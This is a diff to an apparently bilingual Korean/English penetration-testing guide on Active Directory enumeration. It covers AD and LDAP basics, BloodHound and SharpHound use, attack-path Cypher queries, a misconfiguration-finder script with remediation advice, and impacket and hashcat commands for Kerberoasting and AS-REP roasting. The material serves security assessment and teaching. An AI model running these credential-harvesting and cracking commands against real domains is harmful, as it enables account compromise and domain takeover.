@@ -6,6 +6,86 @@
 
 # Active Directory 열거 — BloodHound·LDAP·자동화
 
+## 0. 초보자를 위한 Active Directory 개념 설명
+
+### 0.1 Active Directory란 무엇인가? (회사 전화번호부 비유)
+
+Active Directory(AD)를 처음 접하면 복잡하게 느껴진다. 가장 쉬운 비유는 **"회사 전화번호부 + 출입 통제 시스템"**이다.
+
+```
+[현실 세계 비유]
+
+회사 건물 = 도메인 (domain.local)
+ ├── 직원 명부 = 사용자 계정 (User accounts)
+ ├── 부서 목록 = 그룹 (Groups)
+ ├── 각 방의 열쇠 = 권한 (Permissions)
+ ├── 경비실 = 도메인 컨트롤러 (Domain Controller)
+ └── 건물 안내판 = LDAP 디렉터리 서비스
+
+경비실(DC)이 하는 일:
+  - 직원이 열쇠(비밀번호)로 출입 시도 → 명부 확인 → 허가/거절
+  - 모든 방의 열쇠 정보를 중앙 관리
+  - 부서 이동 시 권한 자동 업데이트
+```
+
+실제 기업 환경에서 Active Directory는:
+- 수천 명의 직원 계정을 한 곳에서 관리
+- 어떤 컴퓨터에서 로그인해도 같은 계정 사용 가능
+- 파일 서버, 이메일, 업무 시스템 모두 AD 계정으로 통합 인증
+
+**공격자 관점:** AD를 장악하면 회사 IT 인프라 전체를 통제할 수 있다. 그래서 AD는 레드팀의 최종 목표이자 방어팀의 핵심 보호 대상이다.
+
+### 0.2 도메인, 포레스트, OU 구조
+
+```
+[AD 구조 계층도]
+
+포레스트 (Forest) = 최상위 경계
+└── 도메인 (Domain): corp.local
+    ├── 트리 도메인: asia.corp.local
+    │   └── 하위 도메인: kr.asia.corp.local
+    └── OU (Organizational Unit) = 폴더와 같은 개념
+        ├── OU=서울사무소
+        │   ├── OU=개발팀
+        │   │   ├── user: alice (alice@corp.local)
+        │   │   └── user: bob
+        │   └── OU=영업팀
+        └── OU=서버
+            ├── computer: WEB01
+            └── computer: DB01
+```
+
+| 개념 | 설명 | 비유 |
+|------|------|------|
+| 포레스트 | 모든 도메인의 최상위 집합 | 기업 그룹 전체 |
+| 도메인 | 보안 경계 단위 | 계열사 |
+| OU | 도메인 내 조직 단위 | 부서 |
+| 트러스트 | 도메인 간 신뢰 관계 | 계열사 간 협약 |
+| DC | 도메인 컨트롤러, 인증 서버 | 경비실 |
+| GPO | 그룹 정책, 도메인 전체 설정 | 사내 규정 |
+
+### 0.3 LDAP이란 무엇인가?
+
+LDAP(Lightweight Directory Access Protocol)은 AD의 **"조회 언어"**다. 회사 전화번호부에서 "개발팀 직원 중 이름이 김씨인 사람 찾기"를 하는 것처럼, LDAP 쿼리로 AD에서 원하는 객체를 검색한다.
+
+```
+[LDAP 구조 이해]
+
+DN (Distinguished Name) = 객체의 전체 경로:
+  CN=Alice,OU=개발팀,OU=서울사무소,DC=corp,DC=local
+   │         │               │           │
+  이름      부서           사무소        도메인
+
+LDAP 필터 문법:
+  (objectClass=user)            → 사용자 객체 모두
+  (sAMAccountName=alice)        → 계정명이 alice인 것
+  (&(objectClass=user)(mail=*)) → 이메일이 있는 사용자
+  (|(cn=alice)(cn=bob))         → alice 또는 bob
+  (!objectClass=computer))      → 컴퓨터가 아닌 것
+```
+
+---
+
 ## 1. AD 공격 로드맵
 
 ```
@@ -88,11 +168,84 @@ ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
   sAMAccountName servicePrincipalName
 ```
 
+### 2.3 주요 LDAP 필터 레퍼런스
+
+| 목적 | LDAP 필터 |
+|------|-----------|
+| 모든 사용자 | `(&(objectClass=user)(objectCategory=person))` |
+| 활성화된 계정만 | `(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))` |
+| SPN 설정 계정 | `(&(objectClass=user)(servicePrincipalName=*))` |
+| PreAuth 불필요 | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` |
+| 비밀번호 만료 없음 | `(userAccountControl:1.2.840.113556.1.4.803:=65536)` |
+| 모든 그룹 | `(objectClass=group)` |
+| 모든 컴퓨터 | `(objectClass=computer)` |
+| DC 계정 | `(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))` |
+
 ---
 
 ## 3. BloodHound 수집 및 분석
 
-### 3.1 SharpHound 데이터 수집
+### 3.1 BloodHound란 무엇인가?
+
+BloodHound는 AD 공격 경로를 **그래프 데이터베이스(Neo4j)**로 시각화하는 도구다.
+
+```
+[BloodHound가 하는 일]
+
+AD 데이터 수집 (SharpHound)
+        │
+        ▼
+Neo4j 그래프 DB에 저장
+        │
+        ▼
+시각화 + Cypher 쿼리로 공격 경로 탐색
+
+예시: "일반 사용자 alice에서 Domain Admin까지 가는 경로가 있는가?"
+  alice → 로컬 관리자(WEB01) → WEB01에서 세션 가진 admin → Domain Admin
+```
+
+### 3.2 BloodHound 설치 및 설정 (단계별)
+
+```bash
+# --- Neo4j 설치 (Ubuntu/Debian) ---
+# Java 설치
+sudo apt install -y openjdk-11-jdk
+
+# Neo4j 저장소 추가
+wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
+echo 'deb https://debian.neo4j.com stable latest' | sudo tee /etc/apt/sources.list.d/neo4j.list
+sudo apt update && sudo apt install -y neo4j
+
+# Neo4j 서비스 시작
+sudo systemctl start neo4j
+sudo systemctl enable neo4j
+
+# Neo4j 초기 비밀번호 변경
+# 브라우저에서 http://localhost:7474 접속
+# 기본 계정: neo4j / neo4j → 새 비밀번호로 변경
+
+# --- BloodHound GUI 설치 ---
+# GitHub 릴리즈에서 최신 버전 다운로드
+wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.3.1/BloodHound-linux-x64.zip
+unzip BloodHound-linux-x64.zip
+cd BloodHound-linux-x64
+./BloodHound --no-sandbox
+
+# BloodHound 실행 후 Neo4j 자격증명으로 로그인
+```
+
+```bash
+# --- BloodHound CE (Community Edition, 최신 버전) ---
+# Docker Compose로 실행
+git clone https://github.com/SpecterOps/BloodHound.git
+cd BloodHound
+docker compose -f docker-compose.yml up -d
+
+# 접속: http://localhost:8080
+# 초기 자격증명은 콘솔 출력에서 확인
+```
+
+### 3.3 SharpHound 데이터 수집 (단계별 가이드)
 
 ```powershell
 # SharpHound 실행 (PowerShell)
@@ -119,7 +272,34 @@ bloodhound-python -u user@domain.local -p Password \
   --zip -o /tmp/bloodhound/
 ```
 
-### 3.2 BloodHound Cypher 쿼리
+### 3.4 SharpHound 수집 방법 비교
+
+| 수집 방법 | 설명 | 네트워크 소음 | 권장 상황 |
+|-----------|------|--------------|-----------|
+| `Default` | 세션, 로컬 관리자, 그룹 | 보통 | 일반 환경 |
+| `All` | 전체 (Default + ACL + ObjectProps) | 높음 | 느린 환경 허용 시 |
+| `DCOnly` | DC에서만 LDAP 쿼리 | 낮음 | 은밀한 수집 필요 시 |
+| `Session` | 로그온 세션만 | 매우 높음 | 세션 정보 필요 시 |
+| `ACL` | ACL 정보만 | 낮음 | 권한 분석에 집중 시 |
+| `ObjectProps` | 객체 속성만 | 낮음 | 기본 열거 후 보완 |
+
+### 3.5 BloodHound 데이터 임포트 및 분석
+
+```
+[BloodHound 사용 워크플로우]
+
+1. SharpHound/bloodhound-python 실행 → ZIP 파일 생성
+2. BloodHound GUI 실행
+3. 우측 상단 Upload Data 버튼 → ZIP 파일 업로드
+4. 데이터베이스에 노드/엣지 생성 완료
+5. 분석 시작:
+   a. Pre-Built Analytics → Shortest Paths to Domain Admins
+   b. Raw Query 탭 → 커스텀 Cypher 쿼리 입력
+   c. 노드 클릭 → 속성, 관계 확인
+   d. 경로에서 "Mark User as Owned" → 장악한 계정 표시
+```
+
+### 3.6 BloodHound Cypher 쿼리
 
 ```cypher
 // 도메인 관리자까지 최단 경로
@@ -143,6 +323,58 @@ MATCH p=(u:User {owned:true})-[r:AdminTo]->(c:Computer) RETURN p
 
 // 신뢰 관계 맵
 MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d1.name, r.trusttype, d2.name
+```
+
+### 3.7 핵심 BloodHound Cypher 쿼리 (상세 설명 포함)
+
+```cypher
+// ===== 고가치 타깃 탐색 =====
+
+// 1. 장악된 계정에서 DA까지 모든 경로 (최단 아닌 전체)
+MATCH p=allShortestPaths(
+  (u:User {owned:true})-[*1..10]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+)
+RETURN p
+
+// 설명: owned:true 는 BloodHound에서 수동으로 표시한 "장악한 계정"
+// [*1..10] = 최대 10단계 관계 체인
+
+// 2. 위험한 ACL 관계 탐색 (GenericAll, WriteDACL 등)
+MATCH (u:User)-[r:GenericAll|WriteDACL|WriteOwner|GenericWrite]->(c)
+WHERE u.enabled = true
+RETURN u.name, type(r), c.name
+ORDER BY u.name
+
+// 설명: 이런 권한이 있으면 공격자가 직접 비밀번호 변경, 권한 부여 가능
+
+// 3. Kerberoastable 계정 + 관리자 그룹 멤버십 확인
+MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)
+WHERE g.name CONTAINS "ADMIN"
+RETURN u.name, u.serviceprincipalnames, g.name
+
+// 4. 컴퓨터에서 DA 세션이 있는 경로
+MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+RETURN c.name, u.name
+
+// 설명: DA가 로그온한 컴퓨터 = 메모리에서 자격증명 탈취 가능
+
+// 5. 비활성화되지 않은 계정 중 90일 이상 미로그온
+MATCH (u:User)
+WHERE u.enabled = true
+  AND u.lastlogontimestamp < (timestamp() - 7776000000)
+RETURN u.name, u.lastlogontimestamp
+ORDER BY u.lastlogontimestamp
+
+// 6. 신뢰 관계를 통한 다른 도메인 접근 경로
+MATCH (d1:Domain {name:"CORP.LOCAL"})-[r:TrustedBy]->(d2:Domain)
+RETURN d1.name, r.trusttype, r.transitive, d2.name
+
+// 7. OU별 고위험 계정 분포
+MATCH (u:User)-[:MemberOf]->(g:Group)
+WHERE g.name CONTAINS "ADMIN" OR g.name CONTAINS "OPERATOR"
+WITH split(u.distinguishedname, ",") AS dn_parts, u
+RETURN dn_parts[1] AS ou, count(u) AS admin_count
+ORDER BY admin_count DESC
 ```
 
 ---
@@ -330,7 +562,336 @@ if __name__ == "__main__":
 
 ---
 
-## 5. 참고 도구
+## 5. 고급 Python ldap3 열거 스크립트
+
+```python
+#!/usr/bin/env python3
+"""
+고급 AD 열거 스크립트 — 잘못된 설정(misconfiguration) 탐지 포함
+사용법: python3 ad_misconfig_finder.py 10.10.10.100 corp.local -u alice -p Pass123
+"""
+
+import argparse
+import json
+from dataclasses import dataclass, field
+from datetime import datetime, timezone, timedelta
+from pathlib import Path
+from typing import Any
+
+from ldap3 import ALL, NTLM, SAFE_SYNC, Connection, Server, SUBTREE
+from ldap3.core.exceptions import LDAPException
+
+
+@dataclass
+class Misconfiguration:
+    category: str        # 카테고리 (예: KERBEROASTING, WEAK_PASSWORD)
+    severity: str        # HIGH / MEDIUM / LOW
+    account: str         # 영향받는 계정
+    description: str     # 상세 설명
+    recommendation: str  # 권고 조치
+
+
+class ADMisconfigFinder:
+    """AD 잘못된 설정 탐지기."""
+
+    def __init__(self, dc_ip: str, domain: str, username: str, password: str) -> None:
+        self.domain = domain
+        self.base_dn = ",".join(f"DC={p}" for p in domain.split("."))
+        server = Server(dc_ip, get_info=ALL)
+        self.conn = Connection(
+            server,
+            user=f"{domain}\\{username}",
+            password=password,
+            authentication=NTLM,
+            client_strategy=SAFE_SYNC,
+            auto_bind=True,
+        )
+        self.findings: list[Misconfiguration] = []
+
+    def _search(
+        self,
+        ldap_filter: str,
+        attributes: list[str],
+        base: str | None = None,
+    ) -> list[Any]:
+        self.conn.search(
+            search_base=base or self.base_dn,
+            search_filter=ldap_filter,
+            search_scope=SUBTREE,
+            attributes=attributes,
+        )
+        return list(self.conn.entries)
+
+    def check_kerberoastable(self) -> None:
+        """SPN이 설정된 일반 사용자 계정 탐지."""
+        entries = self._search(
+            "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))"
+            "(!(cn=krbtgt)))",
+            ["sAMAccountName", "servicePrincipalName", "memberOf", "pwdLastSet"],
+        )
+        for entry in entries:
+            username = str(entry.sAMAccountName)
+            spns = list(entry.servicePrincipalName.values)
+            pwd_age = "Unknown"
+            if entry.pwdLastSet and entry.pwdLastSet.value:
+                try:
+                    last_set = entry.pwdLastSet.value
+                    if isinstance(last_set, datetime):
+                        age_days = (datetime.now(timezone.utc) - last_set.replace(tzinfo=timezone.utc)).days
+                        pwd_age = f"{age_days}일"
+                except Exception:
+                    pass
+
+            self.findings.append(Misconfiguration(
+                category="KERBEROASTING",
+                severity="HIGH",
+                account=username,
+                description=f"SPN 설정된 계정 (비밀번호 나이: {pwd_age}). SPNs: {spns[:2]}",
+                recommendation="서비스 계정 비밀번호를 25자 이상 복잡한 값으로 변경하고, "
+                               "MSA/gMSA 계정으로 전환 권장",
+            ))
+
+    def check_asrep_roastable(self) -> None:
+        """Pre-authentication 불필요 계정 탐지."""
+        entries = self._search(
+            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
+            ["sAMAccountName", "memberOf"],
+        )
+        for entry in entries:
+            username = str(entry.sAMAccountName)
+            self.findings.append(Misconfiguration(
+                category="ASREP_ROASTING",
+                severity="HIGH",
+                account=username,
+                description="Pre-authentication이 비활성화된 계정. "
+                            "크래킹 가능한 해시를 인증 없이 획득 가능",
+                recommendation="'계정에 Kerberos 사전 인증 필요 없음' 설정 해제",
+            ))
+
+    def check_password_never_expires(self) -> None:
+        """비밀번호 만료 없는 계정 (서비스 계정 제외 필요)."""
+        entries = self._search(
+            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)"
+            "(!(objectClass=computer)))",
+            ["sAMAccountName", "lastLogonTimestamp", "memberOf"],
+        )
+        for entry in entries:
+            username = str(entry.sAMAccountName)
+            # 관리자 그룹 멤버인지 확인
+            members = [str(m) for m in (entry.memberOf.values if hasattr(entry.memberOf, "values") else [])]
+            is_privileged = any("ADMIN" in m.upper() for m in members)
+            self.findings.append(Misconfiguration(
+                category="PWD_NEVER_EXPIRES",
+                severity="HIGH" if is_privileged else "MEDIUM",
+                account=username,
+                description=f"비밀번호 만료 없는 계정. 특권 그룹 멤버: {is_privileged}",
+                recommendation="비밀번호 만료 정책 적용. 서비스 계정은 gMSA로 전환",
+            ))
+
+    def check_admin_count(self) -> None:
+        """adminCount=1인 계정 (보호 계정) 목록 — 과도한 경우 위험."""
+        entries = self._search(
+            "(&(objectClass=user)(adminCount=1)(!(cn=krbtgt)))",
+            ["sAMAccountName", "memberOf"],
+        )
+        admin_users = [str(e.sAMAccountName) for e in entries]
+        if len(admin_users) > 20:
+            self.findings.append(Misconfiguration(
+                category="EXCESSIVE_ADMINS",
+                severity="MEDIUM",
+                account=f"총 {len(admin_users)}개 계정",
+                description=f"adminCount=1 계정이 {len(admin_users)}개. "
+                            f"샘플: {admin_users[:5]}",
+                recommendation="최소 권한 원칙 적용. 불필요한 관리자 권한 제거",
+            ))
+
+    def check_stale_accounts(self, days: int = 90) -> None:
+        """장기 미로그온 활성 계정 탐지."""
+        cutoff = datetime.now(timezone.utc) - timedelta(days=days)
+        cutoff_str = cutoff.strftime("%Y%m%d%H%M%S.0Z")
+
+        entries = self._search(
+            f"(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
+            f"(lastLogonTimestamp<={cutoff_str})(lastLogonTimestamp>=19700101000000.0Z))",
+            ["sAMAccountName", "lastLogonTimestamp"],
+        )
+        if len(entries) > 0:
+            self.findings.append(Misconfiguration(
+                category="STALE_ACCOUNTS",
+                severity="MEDIUM",
+                account=f"{len(entries)}개 계정",
+                description=f"{days}일 이상 로그온하지 않은 활성 계정. "
+                            f"비활성화되지 않고 여전히 도메인에 존재",
+                recommendation="미사용 계정 비활성화 또는 삭제. 계정 수명주기 정책 수립",
+            ))
+
+    def run_all_checks(self) -> list[Misconfiguration]:
+        """모든 잘못된 설정 검사 실행."""
+        checks = [
+            ("Kerberoastable 계정", self.check_kerberoastable),
+            ("AS-REP Roastable 계정", self.check_asrep_roastable),
+            ("비밀번호 만료 없는 계정", self.check_password_never_expires),
+            ("과도한 관리자 계정", self.check_admin_count),
+            ("90일 이상 미로그온 계정", self.check_stale_accounts),
+        ]
+        for desc, check_fn in checks:
+            print(f"[*] {desc} 검사 중...")
+            try:
+                check_fn()
+            except Exception as e:
+                print(f"  오류: {e}")
+
+        return self.findings
+
+    def close(self) -> None:
+        self.conn.unbind()
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="AD 잘못된 설정 탐지기",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+예시:
+  python3 ad_misconfig_finder.py 10.10.10.100 corp.local -u alice -p Pass123
+  python3 ad_misconfig_finder.py 10.10.10.100 corp.local -u alice -p Pass123 -o report.json
+        """,
+    )
+    parser.add_argument("dc", help="도메인 컨트롤러 IP")
+    parser.add_argument("domain", help="도메인 (예: corp.local)")
+    parser.add_argument("-u", "--user", required=True, help="사용자명")
+    parser.add_argument("-p", "--password", required=True, help="비밀번호")
+    parser.add_argument("-o", "--output", type=Path, help="JSON 결과 파일")
+    args = parser.parse_args()
+
+    try:
+        finder = ADMisconfigFinder(args.dc, args.domain, args.user, args.password)
+        findings = finder.run_all_checks()
+        finder.close()
+    except LDAPException as e:
+        print(f"LDAP 연결 오류: {e}")
+        raise SystemExit(1)
+
+    # 결과 출력
+    severity_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
+    findings.sort(key=lambda f: severity_order.get(f.severity, 99))
+
+    print(f"\n{'='*65}")
+    print(f"AD 잘못된 설정 탐지 결과 | {args.domain}")
+    print(f"{'='*65}")
+
+    high = sum(1 for f in findings if f.severity == "HIGH")
+    medium = sum(1 for f in findings if f.severity == "MEDIUM")
+    print(f"총 발견: {len(findings)}건 (HIGH: {high}, MEDIUM: {medium})")
+    print()
+
+    for finding in findings:
+        icon = "[!]" if finding.severity == "HIGH" else "[?]"
+        print(f"{icon} [{finding.severity}] {finding.category}")
+        print(f"  계정: {finding.account}")
+        print(f"  설명: {finding.description}")
+        print(f"  권고: {finding.recommendation}")
+        print()
+
+    if args.output:
+        report_data = {
+            "scan_time": datetime.now(timezone.utc).isoformat(),
+            "domain": args.domain,
+            "summary": {"total": len(findings), "high": high, "medium": medium},
+            "findings": [
+                {
+                    "category": f.category,
+                    "severity": f.severity,
+                    "account": f.account,
+                    "description": f.description,
+                    "recommendation": f.recommendation,
+                }
+                for f in findings
+            ],
+        }
+        args.output.write_text(
+            json.dumps(report_data, indent=2, ensure_ascii=False),
+            encoding="utf-8",
+        )
+        print(f"[+] 결과 저장: {args.output}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. 흔한 AD 잘못된 설정 (초보자 가이드)
+
+### 6.1 Kerberoasting이 가능한 이유
+
+```
+[Kerberoasting 원리]
+
+정상 흐름:
+  사용자 → KDC에게 "SQL Server에 접근하고 싶다"
+  KDC → "SQL 서비스 계정(svc_sql)의 해시로 암호화된 티켓을 드릴게요"
+  사용자 → SQL Server에게 티켓 제시 → 접근 허용
+
+공격자 흐름:
+  공격자 → KDC에게 "SQL Server에 접근하고 싶다" (정상 요청!)
+  KDC → 암호화된 티켓 제공 (서비스 계정 해시로 암호화)
+  공격자 → 티켓을 오프라인에서 크래킹 → 서비스 계정 비밀번호 획득!
+
+문제점: 이 요청은 완전히 합법적이어서 탐지가 어렵다
+```
+
+```bash
+# Kerberoasting 실행 (impacket)
+python3 GetUserSPNs.py corp.local/alice:Password123 -dc-ip 10.10.10.100 -request
+
+# 획득한 해시 크래킹
+hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+### 6.2 AS-REP Roasting이 가능한 이유
+
+```
+[AS-REP Roasting 원리]
+
+정상 Kerberos 인증:
+  클라이언트 → KDC: "저는 alice입니다" (암호화된 타임스탬프 포함)
+  KDC: 타임스탬프 검증 후 TGT 발급
+
+Pre-auth 비활성화된 경우:
+  공격자 → KDC: "저는 alice입니다" (타임스탬프 불필요!)
+  KDC: 검증 없이 alice의 해시로 암호화된 응답 전송
+  공격자: 응답을 오프라인에서 크래킹 → alice 비밀번호 획득!
+
+비유: 신분 확인 없이 "OOO씨 계신가요?"만 해도
+      OOO씨 목소리(해시)를 들을 수 있는 상황
+```
+
+```bash
+# AS-REP Roasting (impacket)
+python3 GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.100 -format hashcat
+
+# 해시 크래킹
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+### 6.3 주요 잘못된 설정 요약표
+
+| 잘못된 설정 | 위험도 | 공격 기법 | 탐지 방법 |
+|------------|--------|-----------|-----------|
+| SPN 설정된 일반 계정 | HIGH | Kerberoasting | 이벤트 4769, RC4 암호화 요청 |
+| Pre-auth 비활성화 | HIGH | AS-REP Roasting | 이벤트 4768 |
+| 과도한 도메인 관리자 | HIGH | 직접 권한 남용 | 관리자 그룹 멤버 감사 |
+| AdminSDHolder 수정 | HIGH | ACL 기반 지속성 | 이벤트 5136 |
+| DCSync 권한 오부여 | CRITICAL | DCSync | 이벤트 4662 |
+| 비밀번호 정책 없음 | MEDIUM | 브루트 포스 | 계정 잠금 임계값 확인 |
+| LAPS 미사용 | MEDIUM | 로컬 관리자 해시 재사용 | LAPS 배포 현황 |
+| SMB 서명 비활성화 | HIGH | NTLM 릴레이 | SMB 서명 정책 확인 |
+
+---
+
+## 7. 참고 도구
 
 | 도구 | 용도 |
 |------|------|
@@ -348,6 +909,86 @@ if __name__ == "__main__":
 <a name="english"></a>
 
 # Active Directory Enumeration — BloodHound, LDAP, and Automation
+
+## 0. Active Directory for Beginners
+
+### 0.1 What is Active Directory? (The Company Phone Book Analogy)
+
+Active Directory can feel overwhelming at first. The best analogy is a **"company phone book combined with an access control system."**
+
+```
+[Real World Analogy]
+
+Company building       = Domain (corp.local)
+ ├── Employee roster   = User accounts
+ ├── Department list   = Groups
+ ├── Room keys         = Permissions / ACLs
+ ├── Security desk     = Domain Controller (DC)
+ └── Building directory = LDAP directory service
+
+What the security desk (DC) does:
+  - Employee presents badge (password) → checks roster → allow/deny
+  - Centrally manages all room keys
+  - Automatically updates permissions when someone changes departments
+```
+
+In real enterprise environments, Active Directory:
+- Manages thousands of employee accounts from a single place
+- Lets you log in from any computer with the same credentials
+- Integrates authentication across file servers, email, and business apps
+
+**Attacker's perspective:** Compromising AD means controlling the entire corporate IT infrastructure. That is why AD is the ultimate target for red teams and the most critical asset for defenders.
+
+### 0.2 Domain, Forest, and OU Structure
+
+```
+[AD Hierarchy]
+
+Forest (top-level boundary)
+└── Domain: corp.local
+    ├── Child domain: asia.corp.local
+    │   └── Grandchild: kr.asia.corp.local
+    └── OUs (like folders in a filing cabinet)
+        ├── OU=Seoul-Office
+        │   ├── OU=Engineering
+        │   │   ├── user: alice (alice@corp.local)
+        │   │   └── user: bob
+        │   └── OU=Sales
+        └── OU=Servers
+            ├── computer: WEB01
+            └── computer: DB01
+```
+
+| Concept | Description | Analogy |
+|---------|-------------|---------|
+| Forest | Top-level collection of all domains | Corporate group |
+| Domain | Security boundary unit | Subsidiary company |
+| OU | Organizational unit within a domain | Department |
+| Trust | Trust relationship between domains | Inter-subsidiary agreement |
+| DC | Domain Controller — the authentication server | Security desk |
+| GPO | Group Policy Object — domain-wide settings | Company policy manual |
+
+### 0.3 What is LDAP?
+
+LDAP (Lightweight Directory Access Protocol) is the **"query language"** for Active Directory. Just like searching a company phone book for "all engineers in the Seoul office," LDAP filters let you search AD for exactly the objects you need.
+
+```
+[LDAP Concepts]
+
+DN (Distinguished Name) = full path to an object:
+  CN=Alice,OU=Engineering,OU=Seoul-Office,DC=corp,DC=local
+   │          │                  │              │
+  Name      Department         Office         Domain
+
+LDAP Filter Syntax:
+  (objectClass=user)               → all user objects
+  (sAMAccountName=alice)           → account named alice
+  (&(objectClass=user)(mail=*))    → users that have email
+  (|(cn=alice)(cn=bob))            → alice OR bob
+  (!(objectClass=computer))        → exclude computers
+```
+
+---
 
 ## 1. AD Attack Roadmap
 
@@ -392,30 +1033,131 @@ Using `ldapsearch` from Linux without domain membership:
 - Authenticated user/SPN enumeration via LDAP filters
 - LDAP filter `(&(servicePrincipalName=*)(objectClass=user))` finds Kerberoastable accounts
 
+### 2.3 LDAP Filter Quick Reference
+
+| Purpose | LDAP Filter |
+|---------|-------------|
+| All users | `(&(objectClass=user)(objectCategory=person))` |
+| Enabled accounts only | `(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))` |
+| Accounts with SPNs | `(&(objectClass=user)(servicePrincipalName=*))` |
+| Pre-auth not required | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` |
+| Password never expires | `(userAccountControl:1.2.840.113556.1.4.803:=65536)` |
+| All computers | `(objectClass=computer)` |
+| Domain Controllers | `(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))` |
+
 ---
 
 ## 3. BloodHound Collection and Analysis
 
-### 3.1 SharpHound Data Collection
+### 3.1 What is BloodHound?
 
-SharpHound collection methods:
-- `Default` — sessions, local admins, group memberships
-- `All` — complete collection
-- `Session` — active sessions only
-- `DCOnly` — DC-only collection (minimal network noise)
+BloodHound visualizes AD attack paths using a **graph database (Neo4j)**. It answers questions like: "Is there any path from a regular user account to Domain Admin?"
 
-On Linux, `bloodhound-python` provides equivalent collection without domain membership.
+```
+[BloodHound workflow]
 
-### 3.2 BloodHound Cypher Queries
+Collect AD data (SharpHound / bloodhound-python)
+        │
+        ▼
+Import into Neo4j graph database
+        │
+        ▼
+Visualize + query with Cypher to find attack paths
 
-| Query Purpose | Cypher Pattern |
-|--------------|---------------|
-| Shortest path to Domain Admins | `shortestPath((u:User {owned:true})-[*1..]->(g:Group {...}))` |
-| Kerberoastable accounts | `MATCH (u:User {hasspn:true})` |
-| AS-REP Roastable | `MATCH (u:User {dontreqpreauth:true})` |
-| DCSync rights holders | `MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain)` |
-| Password never expires | `MATCH (u:User {pwdneverexpires:true, enabled:true})` |
-| Trust relationships | `MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain)` |
+Example: "Does a path exist from 'alice' to Domain Admin?"
+  alice → local admin on WEB01 → DA has session on WEB01 → DA credentials
+```
+
+### 3.2 BloodHound Setup (Step by Step)
+
+```bash
+# Install Neo4j (Ubuntu/Debian)
+sudo apt install -y openjdk-11-jdk
+wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
+echo 'deb https://debian.neo4j.com stable latest' | sudo tee /etc/apt/sources.list.d/neo4j.list
+sudo apt update && sudo apt install -y neo4j
+sudo systemctl start neo4j
+
+# Change default password via http://localhost:7474
+# Default: neo4j / neo4j
+
+# BloodHound CE via Docker (recommended)
+git clone https://github.com/SpecterOps/BloodHound.git
+cd BloodHound
+docker compose up -d
+# Access: http://localhost:8080
+```
+
+### 3.3 SharpHound Collection Methods
+
+| Method | Description | Network Noise | When to Use |
+|--------|-------------|--------------|-------------|
+| `Default` | Sessions, local admins, groups | Medium | Standard assessment |
+| `All` | Everything (Default + ACLs + ObjectProps) | High | When noise is acceptable |
+| `DCOnly` | LDAP queries to DC only | Low | Stealth collection |
+| `Session` | Active logon sessions only | Very High | Need session data |
+| `ACL` | ACL data only | Low | Focus on permission analysis |
+
+```bash
+# Linux collection (no domain join required)
+pip install bloodhound
+bloodhound-python -u user@domain.local -p Password \
+  -ns 10.10.10.100 -d domain.local -c all --zip -o /tmp/bloodhound/
+```
+
+### 3.4 BloodHound Cypher Queries
+
+```cypher
+// Shortest path to Domain Admins from owned accounts
+MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
+RETURN p
+
+// Kerberoastable accounts
+MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames
+
+// AS-REP Roastable accounts
+MATCH (u:User {dontreqpreauth:true}) RETURN u.name
+
+// Accounts with DCSync rights
+MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN n.name, d.name
+
+// Password never expires (active)
+MATCH (u:User {pwdneverexpires:true, enabled:true}) RETURN u.name
+
+// Trust relationship map
+MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d1.name, r.trusttype, d2.name
+```
+
+### 3.5 Advanced Cypher Queries with Explanations
+
+```cypher
+// All paths (not just shortest) from owned to DA — up to 10 hops
+MATCH p=allShortestPaths(
+  (u:User {owned:true})-[*1..10]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+)
+RETURN p
+
+// Dangerous ACL relationships — attacker can change passwords or grant permissions
+MATCH (u:User)-[r:GenericAll|WriteDACL|WriteOwner|GenericWrite]->(c)
+WHERE u.enabled = true
+RETURN u.name, type(r), c.name
+ORDER BY u.name
+
+// Kerberoastable accounts that are also in admin groups
+MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)
+WHERE g.name CONTAINS "ADMIN"
+RETURN u.name, u.serviceprincipalnames, g.name
+
+// Computers where Domain Admins have active sessions
+MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
+RETURN c.name, u.name
+// Explanation: DA logged onto a computer = credentials potentially in memory
+
+// Trust relationships and their properties
+MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain)
+RETURN d1.name, r.trusttype, r.transitive, d2.name
+// Transitive trusts allow crossing multiple domain boundaries
+```
 
 ---
 
